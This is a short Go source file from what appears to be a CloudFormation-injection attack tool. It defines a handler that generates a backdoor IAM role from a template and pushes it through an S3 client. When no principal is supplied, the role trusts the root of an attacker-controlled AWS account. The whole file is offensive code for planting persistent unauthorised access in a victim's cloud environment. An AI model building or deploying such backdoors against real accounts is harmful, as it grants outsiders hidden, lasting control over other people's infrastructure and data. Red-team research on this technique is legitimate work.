package cfni

import "fmt"

type CreateIAMRoleBackdoorOptions struct {
	Principal   string
	LogicalID   string
	RoleName    string
	S3AccessKey *S3AccessKey
}

func (c *CFNI) CreateIAMRoleBackdoorHandler(opts *CreateIAMRoleBackdoorOptions) ([]byte, error) {
	if opts.Principal == "" {
		opts.Principal = fmt.Sprintf("arn:aws:iam::%s:root", c.attackerAccount)
	}

	type data struct {
		Principal string
		LogicalID string
		RoleName  string
	}

	return c.createHandler(&HandlerOptions{
		CFNITemplate: "templates/iam_role_backdoor.py",
		CFNIData: &data{
			Principal: opts.Principal,
			LogicalID: opts.LogicalID,
			RoleName:  opts.RoleName,
		},
		S3Client: s3Client(opts.S3AccessKey),
	})
}
